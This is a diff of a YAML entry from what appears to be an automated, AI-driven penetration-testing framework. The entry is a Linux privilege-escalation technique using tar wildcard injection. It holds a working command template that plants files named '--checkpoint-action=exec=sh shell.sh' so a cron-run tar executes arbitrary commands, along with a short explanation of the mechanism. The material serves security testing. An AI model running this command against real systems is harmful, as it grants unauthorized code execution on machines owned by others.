@@ -2,15 +2,19 @@ name: wildcard_injection
 category: privesc
 description: Wildcard injection in cron/script tar/rsync
 preconditions:
-  - os==linux
+- os==linux
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "echo '' > '/path/--checkpoint=1'; echo '' > '/path/--checkpoint-action=exec=sh shell.sh'"
+command_template: echo '' > '/path/--checkpoint=1'; echo '' > '/path/--checkpoint-action=exec=sh
+  shell.sh'
 parser: null
 expected_effects:
-  - action_completed
+- action_completed
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "If cron runs 'tar cf backup.tar *' in a directory you can write to, create files named as tar flags. --checkpoint-action=exec= executes arbitrary commands as the cron user."
+mechanism: If cron runs 'tar cf backup.tar *' in a directory you can write to, create
+  files named as tar flags. --checkpoint-action=exec= executes arbitrary commands
+  as the cron user.
+hacktricks_ref: linux-hardening/bypass-bash-restrictions/README.md
